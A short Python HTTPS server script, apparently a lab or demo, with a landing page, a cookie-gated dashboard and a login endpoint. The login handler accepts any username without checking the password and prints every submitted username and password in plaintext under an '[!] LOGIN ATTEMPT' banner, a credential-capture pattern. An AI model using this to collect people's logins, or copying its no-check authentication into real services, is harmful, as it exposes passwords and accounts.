#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import urllib.parse
import uuid

sessions = {}

class SecureHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<html><body><h1>HTTPS Server Running</h1><p>This connection is encrypted.</p></body></html>")
        elif self.path == '/dashboard':
            cookie_header = self.headers.get('Cookie', '')
            if 'sessionid=' in cookie_header:
                session_id = cookie_header.split('sessionid=')[1].split(';')[0]
                if session_id in sessions:
                    username = sessions[session_id]
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(f"<html><body><h1>Welcome {username}!</h1><p>Encrypted dashboard.</p></body></html>".encode())
                    return
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b"Unauthorized")
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            params = urllib.parse.parse_qs(post_data.decode())
            
            username = params.get('user', [''])[0]
            password = params.get('pass', [''])[0]
            
            print(f"\n[!] HTTPS LOGIN ATTEMPT: {username}:{password}")
            
            session_id = str(uuid.uuid4())
            sessions[session_id] = username
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Set-Cookie', f'sessionid={session_id}; Path=/; HttpOnly')
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Login Successful via HTTPS!</h1></body></html>")
        else:
            self.send_response(404)
            self.end_headers()

# Create SSL context (modern method)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')

httpd = HTTPServer(('0.0.0.0', 443), SecureHandler)
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print("[*] Starting HTTPS server on port 443")
httpd.serve_forever()
